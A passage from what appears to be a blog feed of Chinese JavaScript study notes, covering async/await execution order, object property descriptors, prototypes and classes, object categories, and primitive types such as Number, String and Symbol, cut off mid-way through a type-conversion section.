class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">3</span>)</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">4</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async <span class="keyword">function</span> <span class="title function_">t2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">5</span>)</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">6</span>)</span><br><span class="line">  await Promise.resolve().then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;t2p&#x27;</span>))</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">7</span>)</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">8</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">t1()</span><br><span class="line">t2()</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;end&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">async <span class="keyword">function</span> <span class="title function_">t1</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">1</span>)</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">2</span>)</span><br><span class="line">  await <span class="keyword">new</span> Promise(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;t1p&#x27;</span>)</span><br><span class="line">      resolve()</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  await <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">3</span>)</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">4</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async <span class="keyword">function</span> <span class="title function_">t2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">5</span>)</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">6</span>)</span><br><span class="line">  await Promise.resolve().then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;t2p&#x27;</span>))</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">7</span>)</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">8</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">t1()</span><br><span class="line">t2()</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;end&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>对于这两个例子我好难解释清楚，总之就是遇到 <code>await</code> 就可以像下面这样理解：</p></blockquote><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 正常代码</span></span><br><span class="line">await Promise.resolve().then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;t2p&#x27;</span>))</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">7</span>)</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类似等价于</span></span><br><span class="line">Promise.resolve().then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;t2p&#x27;</span>))</span><br><span class="line">  .then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">7</span>)</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">8</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03丨JavaScript-对象</title>
      <link href="/Blog/2019/01/29/relearn_FE/03%E4%B8%A8JavaScript-%E5%AF%B9%E8%B1%A1/index/"/>
      <url>/Blog/2019/01/29/relearn_FE/03%E4%B8%A8JavaScript-%E5%AF%B9%E8%B1%A1/index/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是面向对象？"><a href="#什么是面向对象？" class="headerlink" title="什么是面向对象？"></a>什么是面向对象？</h3><p>对象并不是计算机领域凭空造出来的概念，它是顺着人类思维模式产生的一种抽象（于是面向对象编程也被认为是：更接近人类思维模式的一种编程范式）。</p><p>那么，我们先来看看在人类思维模式下，对象究竟是什么。</p><blockquote><p>对象这一概念在人类的幼儿期形成，这远远早于我们编程逻辑中常用的值、过程等概念。<br>在幼年期，我们总是先认识到某一个苹果能吃（这里的某一个苹果就是一个对象），继而认识到所有的苹果都可以吃（这里的所有苹果，就是一个类），再到后来我们才能意识到三个苹果和三个梨之间的联系，进而产生数字“3”（值）的概念。</p></blockquote><p>在《面向对象分析与设计》这本书中，Grady Booch 替我们做了总结，他认为，从人类的认知角度来说，对象应该是下列事物之一：</p><ol><li>一个可以触摸或者可以看见的东西；</li><li>人的智力可以理解的东西；</li><li>可以指导思考或行动（进行想象或施加动作）的东西。</li></ol><p>有了对象的自然定义后，我们就可以描述编程语言中的对象了。在不同的编程语言中，设计者也利用各种不同的语言特性来抽象描述对象，最为成功的流派是使用“类”的方式来描述对象，这诞生了诸如 C++、Java 等流行的编程语言。</p><h3 id="JavaScript-对象的特征"><a href="#JavaScript-对象的特征" class="headerlink" title="JavaScript 对象的特征"></a>JavaScript 对象的特征</h3><p>在我看来，不论我们使用什么样的编程语言，我们都先应该去理解对象的本质特征（参考 Grandy Booch《面向对象分析与设计》）。总结来看，对象有如下几个特点。</p><ol><li>对象具有唯一标识性：即使看起来完全相同的两个对象，也并非同一个对象。</li><li>对象有状态：对象具有状态，同一对象可能处于不同状态之下。</li><li>对象具有行为：即对象的状态，可能因为它的行为产生变迁。</li></ol><p>我们先来看第一个特征，对象具有唯一标识性。一般而言，各种语言的对象唯一标识性都是用内存地址来体现的， 对象具有唯一标识的内存地址，所以具有唯一的标识。</p><p>关于对象的第二个和第三个特征“状态和行为”，不同语言会使用不同的术语来抽象描述它们，比如 C++ 中称它们为“成员变量”和“成员函数”，Java 中则称它们为“属性”和“方法”。</p><p><strong>在实现了对象基本特征的基础上, 我认为，JavaScript 中对象独有的特色是：对象具有高度的动态性，这是因为 JavaScript 赋予了使用者在运行时为对象添改状态和行为的能力。</strong></p><p>为了提高抽象能力，JavaScript 的属性被设计成比别的语言更加复杂的形式，它提供了数据属性和访问器属性（getter&#x2F;setter）两类。</p><h3 id="JavaScript-对象的两类属性"><a href="#JavaScript-对象的两类属性" class="headerlink" title="JavaScript 对象的两类属性"></a>JavaScript 对象的两类属性</h3><p>对 JavaScript 来说，属性并非只是简单的名称和值，JavaScript 用一组特征（attribute）来描述属性（property）。</p><p>先来说第一类属性，数据属性。它比较接近于其它语言的属性概念。数据属性具有四个特征。</p><ol><li>value：就是属性的值。</li><li>writable：决定属性能否被赋值。</li><li>enumerable：决定 for in 能否枚举该属性。</li><li>configurable：决定该属性能否被删除或者改变特征值。</li></ol><p>在大多数情况下，我们只关心数据属性的值即可。</p><p>第二类属性是访问器（getter&#x2F;setter）属性，它也有四个特征。</p><ol><li>getter：函数或 undefined，在取属性值时被调用。</li><li>setter：函数或 undefined，在设置属性值时被调用。</li><li>enumerable：决定 for in 能否枚举该属性。</li><li>configurable：决定该属性能否被删除或者改变特征值。</li></ol><p>访问器属性使得属性在读和写时执行代码，它允许使用者在写和读属性时，得到完全不同的值，它可以视为一种函数的语法糖。</p><p>我们通常用于定义属性的代码会产生数据属性，其中的 writable、enumerable、configurable 都默认为 true。我们可以使用内置函数 Object.getOwnPropertyDescripter 来查看，如以下代码所示</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">var</span> <span class="string">o</span> <span class="string">=</span> &#123; <span class="attr">a:</span> <span class="number">1</span> &#125;<span class="string">;</span></span><br><span class="line"><span class="string">o.b</span> <span class="string">=</span> <span class="number">2</span><span class="string">;</span></span><br><span class="line"><span class="string">//a</span> <span class="string">和</span> <span class="string">b</span> <span class="string">皆为数据属性</span></span><br><span class="line"><span class="string">Object.getOwnPropertyDescriptor(o,&quot;a&quot;)</span> <span class="string">//</span> &#123;<span class="attr">value:</span> <span class="number">1</span>, <span class="attr">writable:</span> <span class="literal">true</span>, <span class="attr">enumerable:</span> <span class="literal">true</span>, <span class="attr">configurable:</span> <span class="literal">true</span>&#125;</span><br><span class="line"><span class="string">Object.getOwnPropertyDescriptor(o,&quot;b&quot;)</span> <span class="string">//</span> &#123;<span class="attr">value:</span> <span class="number">2</span>, <span class="attr">writable:</span> <span class="literal">true</span>, <span class="attr">enumerable:</span> <span class="literal">true</span>, <span class="attr">configurable:</span> <span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>我们在这里使用了两种语法来定义属性，定义完属性后，我们用 JavaScript 的 API 来查看这个属性，我们可以发现，这样定义出来的属性都是数据属性，writeable、enumerable、configurable 都是默认值为 true。</p><p>如果我们要想改变属性的特征，或者定义访问器属性，我们可以使用 Object.defineProperty，示例如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var o = &#123; a: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Object</span>.</span></span>define<span class="constructor">Property(<span class="params">o</span>, <span class="string">&quot;b&quot;</span>, &#123;<span class="params">value</span>: 2, <span class="params">writable</span>: <span class="params">false</span>, <span class="params">enumerable</span>: <span class="params">false</span>, <span class="params">configurable</span>: <span class="params">true</span>&#125;)</span>;</span><br><span class="line"><span class="comment">//a 和 b 都是数据属性，但特征值变化了</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Object</span>.</span></span>get<span class="constructor">OwnPropertyDescriptor(<span class="params">o</span>,<span class="string">&quot;a&quot;</span>)</span>; <span class="comment">// &#123;value: 1, writable: true, enumerable: true, configurable: true&#125;</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Object</span>.</span></span>get<span class="constructor">OwnPropertyDescriptor(<span class="params">o</span>,<span class="string">&quot;b&quot;</span>)</span>; <span class="comment">// &#123;value: 2, writable: false, enumerable: false, configurable: true&#125;</span></span><br><span class="line">o.b = <span class="number">3</span>; <span class="comment">// 没有报错，但是不能更改</span></span><br><span class="line">console.log(o.b); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><h3 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h3><p>什么是原型？<br>原型是顺应人类自然思维的产物。中文中有个成语叫做“照猫画虎”，这里的猫看起来就是虎的原型，所以，由此我们可以看出，用原型来描述对象的方法可以说是古已有之。</p><p>如果我们抛开 JavaScript 用于模拟 Java 类的复杂语法设施（如 new、Function Object、函数的 prototype 属性等），原型系统可以说相当简单，我可以用两条概括：</p><ol><li>如果所有对象都有私有字段[[prototype]]，就是对象的原型；</li><li>读一个属性，如果对象本身没有，则会继续访问对象的原型，直到原型为空或者找到为止。</li></ol><p>这个模型在 ES 的各个历史版本中并没有很大改变，但从 ES6 以来，JavaScript 提供了一系列内置函数，以便更为直接地访问操纵原型。三个方法分别为：</p><ol><li>Object.create 根据指定的原型创建新对象，原型可以是 null；</li><li>Object.getPrototypeOf 获得一个对象的原型；</li><li>Object.setPrototypeOf 设置一个对象的原型。利用这三个方法，我们可以完全抛开类的思维，利用原型来实现抽象和复用。</li></ol><h3 id="ES6-中的类"><a href="#ES6-中的类" class="headerlink" title="ES6 中的类"></a>ES6 中的类</h3><p>我们先看下类的基本写法：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Rectangle</span> &#123;</span><br><span class="line">  <span class="built_in">constructor</span>(height, width) &#123;</span><br><span class="line">    <span class="keyword">this</span>.height = height;</span><br><span class="line">    <span class="keyword">this</span>.width = width;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Getter</span></span><br><span class="line">  <span class="function">get <span class="title">area</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.<span class="built_in">calcArea</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Method</span></span><br><span class="line">  <span class="built_in">calcArea</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.height * <span class="keyword">this</span>.width;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在现有的类语法中，getter&#x2F;setter 和 method 是兼容性最好的。</p><p>我们通过 get&#x2F;set 关键字来创建 getter，通过括号和大括号来创建方法，数据型成员最好写在构造器里面。</p><p>类的写法实际上也是由原型运行时来承载的，逻辑上 JavaScript 认为每个类是有共同原型的一组对象，类中定义的方法和属性则会被写在原型对象之上。</p><h3 id="JavaScript-中的对象分类"><a href="#JavaScript-中的对象分类" class="headerlink" title="JavaScript 中的对象分类"></a>JavaScript 中的对象分类</h3><p>我们可以把对象分成几类。</p><ul><li><p>宿主对象（host Objects）：由 JavaScript 宿主环境提供的对象，它们的行为完全由宿主环境决定。</p></li><li><p>内置对象（Built-in Objects）：由 JavaScript 语言提供的对象。</p><ul><li>固有对象（Intrinsic Objects ）：由标准规定，随着 JavaScript 运行时创建而自动创建的对象实例。</li><li>原生对象（Native Objects）：可以由用户通过 Array、RegExp 等内置构造器或者特殊语法创建的对象。</li><li>普通对象（Ordinary Objects）：由{}语法、Object 构造器或者 class 关键字定义类创建的对象，它能够被原型继承。</li></ul></li></ul><h5 id="宿主对象"><a href="#宿主对象" class="headerlink" title="宿主对象"></a>宿主对象</h5><p>JavaScript 宿主对象千奇百怪，但是前端最熟悉的无疑是浏览器环境中的宿主了。</p><p>在浏览器环境中，我们都知道全局对象是 window，window 上又有很多属性，如 document。</p><p>实际上，这个全局对象 window 上的属性，一部分来自 JavaScript 语言，一部分来自浏览器环境。</p><p>JavaScript 标准中规定了全局对象属性，w3c 的各种标准中规定了 Window 对象的其它属性。</p><p>宿主对象也分为固有的和用户可创建的两种，比如 document.createElement 就可以创建一些 dom 对象。</p><p>宿主也会提供一些构造器，比如我们可以使用 new Image 来创建 img 元素，这些我们会在浏览器的 API 部分详细讲解。</p><h5 id="内置对象·固有对象"><a href="#内置对象·固有对象" class="headerlink" title="内置对象·固有对象"></a>内置对象·固有对象</h5><p>我们在前面说过，固有对象是由标准规定，随着 JavaScript 运行时创建而自动创建的对象实例。</p><p>固有对象在任何 JS 代码执行前就已经被创建出来了，它们通常扮演者类似基础库的角色。我们前面提到的“类”其实就是固有对象的一种。</p><p>ECMA 标准为我们提供了一份固有对象表，里面含有 150+ 个固有对象。你可以通过<a href="https://www.ecma-international.org/ecma-262/9.0/index.html#sec-well-known-intrinsic-objects">这个链接</a>查看。</p><p>但是遗憾的是，这个表格并不完整。所以在本篇的末尾，我设计了一个小实验（小实验：获取全部 JavaScript 固有对象），你可以自己尝试一下，数一数一共有多少个固有对象。</p><h5 id="内置对象·原生对象"><a href="#内置对象·原生对象" class="headerlink" title="内置对象·原生对象"></a>内置对象·原生对象</h5><p>我们把 JavaScript 中，能够通过语言本身的构造器创建的对象称作原生对象。在 JavaScript 标准中，提供了 30 多个构造器。按照我的理解，按照不同应用场景，我把原生对象分成了以下几个种类。</p><p><img src="/Blog/2019/01/29/relearn_FE/03%E4%B8%A8JavaScript-%E5%AF%B9%E8%B1%A1/index/img.png"></p><p>通过这些构造器，我们可以用 new 运算创建新的对象，所以我们把这些对象称作原生对象。<br>几乎所有这些构造器的能力都是无法用纯 JavaScript 代码实现的，它们也无法用 class&#x2F;extend 语法来继承。</p><p>这些构造器创建的对象多数使用了私有字段, 例如：</p><ul><li>Error: [[ErrorData]]</li><li>Boolean: [[BooleanData]]</li><li>Number: [[NumberData]]</li><li>Date: [[DateValue]]</li><li>RegExp: [[RegExpMatcher]]</li><li>Symbol: [[SymbolData]]</li><li>Map: [[MapData]]</li></ul><p>这些字段使得原型继承方法无法正常工作，所以，我们可以认为，所有这些原生对象都是为了特定能力或者性能，而设计出来的“特权对象”。</p><h5 id="用对象来模拟函数与构造器：函数对象与构造器对象"><a href="#用对象来模拟函数与构造器：函数对象与构造器对象" class="headerlink" title="用对象来模拟函数与构造器：函数对象与构造器对象"></a>用对象来模拟函数与构造器：函数对象与构造器对象</h5><p>我在前面介绍了对象的一般分类，在 JavaScript 中，还有一个看待对象的不同视角，这就是用对象来模拟函数和构造器。</p><p>事实上，JavaScript 为这一类对象预留了私有字段机制，并规定了抽象的函数对象与构造器对象的概念。</p><p><strong>函数对象的定义是：具有 [[call]] 私有字段的对象，构造器对象的定义是：具有私有字段 [[construct]] 的对象。</strong></p><p>JavaScript 用对象模拟函数的设计代替了一般编程语言中的函数，它们可以像其它语言的函数一样被调用、传参。任何宿主只要提供了“具有 [[call]] 私有字段的对象”，就可以被 JavaScript 函数调用语法支持。</p><p>我们可以这样说，任何对象只需要实现 [[call]]，它就是一个函数对象，可以去作为函数被调用。而如果它能实现 [[construct]]，它就是一个构造器对象，可以作为构造器被调用。</p><p>对于为 JavaScript 提供运行环境的程序员来说，只要字段符合，我们在上文中提到的宿主对象和内置对象（如 Symbol 函数）可以模拟函数和构造器。</p><p>当然了，用户用 function 关键字创建的函数必定同时是函数和构造器。</p><blockquote><p>例如：Symbol是没有constructor,不能使用new去实例化对象。</p></blockquote><h5 id="特殊行为的对象"><a href="#特殊行为的对象" class="headerlink" title="特殊行为的对象"></a>特殊行为的对象</h5><p>除了上面介绍的对象之外，在固有对象和原生对象中，有一些对象的行为跟正常对象有很大区别。</p><p>它们常见的下标运算（就是使用中括号或者点来做属性访问）或者设置原型跟普通对象不同，这里我简单总结一下。</p><ul><li>Array：Array 的 length 属性根据最大的下标自动发生变化。</li><li>Object.prototype：作为所有正常对象的默认原型，不能再给它设置原型了。</li><li>String：为了支持下标运算，String 的正整数属性访问会去字符串里查找。</li><li>Arguments：arguments 的非负整数型下标属性跟对应的变量联动。</li><li>模块的 namespace 对象：特殊的地方非常多，跟一般对象完全不一样，尽量只用于 import 吧。</li><li>类型数组和数组缓冲区：跟内存块相关联，下标运算比较特殊。</li><li>bind 后的 function：跟原来的函数相关联。</li></ul>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02丨JavaScript-类型</title>
      <link href="/Blog/2019/01/29/relearn_FE/02%E4%B8%A8JavaScript-%E7%B1%BB%E5%9E%8B/index/"/>
      <url>/Blog/2019/01/29/relearn_FE/02%E4%B8%A8JavaScript-%E7%B1%BB%E5%9E%8B/index/</url>
      
        <content type="html"><![CDATA[<p>先来看下面几个问题</p><ul><li>为什么有的编程规范要求用 void 0 代替 undefined？</li><li>字符串有最大长度吗？</li><li>0.1 + 0.2 不是等于 0.3 么？为什么 JavaScript 里不是这样的？</li><li>ES6 新加入的 Symbol 是个什么东西？</li><li>为什么给对象添加的方法能用在基本类型上？</li></ul><h2 id="Undefined、Null"><a href="#Undefined、Null" class="headerlink" title="Undefined、Null"></a>Undefined、Null</h2><p>因为 JavaScript 的代码 undefined 是一个变量，而并非是一个关键字，这是 JavaScript 语言公认的设计失误之一，所以，我们为了避免无意中被篡改，我建议使用 void 0 来获取 undefined 值。</p><p><strong>undefined在全局环境没法被赋值，在局部环境是可以被赋值的！</strong></p><p>Null 类型也只有一个值，就是 null，它的语义表示空值，与 undefined 不同，null 是 JavaScript 关键字，所以在任何代码中，你都可以放心用 null 关键字来获取 null 值。</p><h2 id="String"><a href="#String" class="headerlink" title="String"></a>String</h2><p>String 用于表示文本数据。String 有最大长度是 2^53 - 1，这在一般开发中都是够用的，但是有趣的是，这个所谓最大长度，并不完全是你理解中的字符数。</p><p>因为 String 的意义并非“字符串”，而是字符串的 UTF16 编码，我们字符串的操作 charAt、charCodeAt、length 等方法针对的都是 UTF16 编码。所以，字符串的最大长度，实际上是受字符串的编码长度影响的。</p><p>JavaScript 字符串把每个 UTF16 单元当作一个字符来处理，所以处理非 BMP（超出 U+0000 - U+FFFF 范围）的字符时，你应该格外小心。</p><p>JavaScript 中的 Number 类型基本符合 IEEE 754-2008 规定的双精度浮点数规则，但是 JavaScript 为了表达几个额外的语言场景（比如不让除以 0 出错，而引入了无穷大的概念），规定了几个例外情况：</p><ul><li>NaN，占用了 9007199254740990，这原本是符合 IEEE 规则的数字；<strong>NaN其实是 2^53-2 个特殊数字的合集，NaN并不是一个数，而是一堆数据合集，所以NaN ! &#x3D;&#x3D; NaN</strong></li><li>Infinity，无穷大；</li><li>-Infinity，负无穷大。</li></ul><p>根据双精度浮点数的定义，Number 类型中有效的整数范围是 -0x1fffffffffffff 至 0x1fffffffffffff，所以 Number 无法精确表示此范围外的整数。</p><blockquote><p>此处为13个f并非17个f，即 2 ^ 52 - 1，前面再加一位，即2 ^ 53 - 1.</p></blockquote><p><code>console.log( 0.1 + 0.2 == 0.3);</code> 这里输出的结果是 false，说明两边不相等的，这是浮点运算的特点，也是很多同学疑惑的来源，浮点数运算的精度问题导致等式左右的结果并不是严格相等，而是相差了个微小的值。</p><blockquote><p>number运算会被转换为二进制进行运算，而后转换为十进制；0.1转换后会变成无限循环小数，即浮点数运算精度问题</p></blockquote><p>所以实际上，这里错误的不是结论，而是比较的方法，正确的比较方法是使用 JavaScript 提供的最小精度值：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">console</span>.log( Math.abs(<span class="number">0</span>.<span class="number">1</span> + <span class="number">0</span>.<span class="number">2</span> - <span class="number">0</span>.<span class="number">3</span>) &lt;= Number.EPSILON);</span><br></pre></td></tr></table></figure><p>检查等式左右两边差的绝对值是否小于最小精度，才是正确的比较浮点数的方法。这段代码结果就是 true 了。</p><h2 id="Number"><a href="#Number" class="headerlink" title="Number"></a>Number</h2><p>下面，我们来说说 Number 类型。Number 类型表示我们通常意义上的“数字”。这个数字大致对应数学中的有理数，当然，在计算机中，我们有一定的精度限制。</p><p>JavaScript 中的 Number 类型有 18437736874454810627(即 2^64 - 2^53 + 3) 个值。</p><blockquote><p> 2^64是64位二进制最多表示的数量，但是IEEE754的1-12位表示指数偏移量，指数偏移量为0的时候，其他位数的值是无意义的，因为任何数的0次方都是1。所以要减去2^(64-11)。+3的话是三个特殊数值：NaN、Infinity、-Infinity。最后结果就是：2^64-2^53+3。</p></blockquote><h2 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h2><p>Symbol 是 ES6 中引入的新类型，它是一切非字符串的对象 key 的集合，在 ES6 规范中，整个对象系统被用 Symbol 重塑。</p><blockquote><p>ES5 的对象属性名都是字符串，字符串容易造成属性名的冲突。比如，你使用了一个他人提供的对象，但又想为这个对象添加新的方法，新方法的名字就有可能与现有方法产生冲突。如果有一种机制，保证每个属性的名字都是独一无二的就好了，这样就从根本上防止属性名的冲突，ES6 引入的Symbol 就表示独一无二的值。</p></blockquote><p>一些标准中提到的 Symbol，可以在全局的 Symbol 函数的属性中找到。例如，我们可以使用 Symbol.iterator 来自定义 for…of 在对象上的行为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="title class_">Object</span></span><br><span class="line"></span><br><span class="line">o[<span class="title class_">Symbol</span>.<span class="property">iterator</span>] = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> v = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">next</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123; <span class="attr">value</span>: v++, <span class="attr">done</span>: v &gt; <span class="number">10</span> &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;        </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> v <span class="keyword">of</span> o) </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(v); <span class="comment">// 0 1 2 3 ... 9</span></span><br></pre></td></tr></table></figure><p>这里我们给对象 o 添加了 Symbol.iterator 属性，并且按照迭代器的要求定义了一个 0 到 10 的迭代器，之后我们就可以在 for of 中愉快地使用这个 o 对象啦。</p><h2 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h2><p>JavaScript 中的几个基本类型，都在对象类型中有一个“亲戚”。它们是：</p><ul><li>Number；</li><li>String；</li><li>Boolean；</li><li>Symbol。</li></ul><p>Number、String 和 Boolean，三个构造器是两用的，当跟 new 搭配时，它们产生对象，当直接调用时，它们表示强制类型转换。</p><p>Symbol 函数比较特殊，直接用 new 调用它会抛出错误，但它仍然是 Symbol 对象的构造器。</p><blockquote><p>围绕原始数据类型创建一个显式包装器对象从 ECMAScript 6 开始不再被支持。 然而，现有的原始包装器对象，如 new Boolean、new String以及new Number，因为遗留原因仍可被创建。</p></blockquote><p>JavaScript 语言设计上试图模糊对象和基本类型之间的关系，我们日常代码可以把对象的方法在基本类型上使用，比如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(<span class="string">&quot;abc&quot;</span>.charAt(<span class="number">0</span>)); <span class="regexp">//</span> a <span class="regexp">//</span> 基本类型凭什么也能 . 出来，又不是对象</span><br></pre></td></tr></table></figure><p>甚至我们在原型上添加方法，都可以应用于基本类型，比如以下代码，在 Symbol 原型上添加了 hello 方法，在任何 Symbol 类型变量都可以调用。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Symbol.prototype.hello = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = Symbol(<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="built_in">typeof</span> a); <span class="comment">//symbol，a并非对象</span></span><br><span class="line">a.hello(); <span class="comment">//hello，有效</span></span><br></pre></td></tr></table></figure><p>所以我们文章开头的问题，答案就是. 运算符提供了装箱操作，它会根据基础类型构造一个临时对象，使得我们能在基础类型上调用对应对象的方法。</p><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p>因为 JS 是弱类型语言，所以类型转换发生非常频繁，大部分我们熟悉的运算都会先进行类型转换。大部分类型转换符合人类的直觉，但是如果我们不去理解类型转换的严格定义，很容易造成一些代码中的判断失误。</p><p>其中最为臭名昭著的是 JavaScript 中的“ &#x3D;&#x3D; ”运算，因为试图实现跨类型的比较，它的规则复杂到几乎没人可以记住。</p><p>其它运算，如加减乘除大于小于，也都会涉及类型转换。幸好的是，实际上大部分类型转换规则是非常简单的，如下表所示：</p><p><img src="/Blog/2019/01/29/relearn_FE/02%E4%B8%A8JavaScript-%E7%B1%BB%E5%9E%8B/index/img.png"></p><p>在这个里面，较为复杂的部分是 Number 和 String 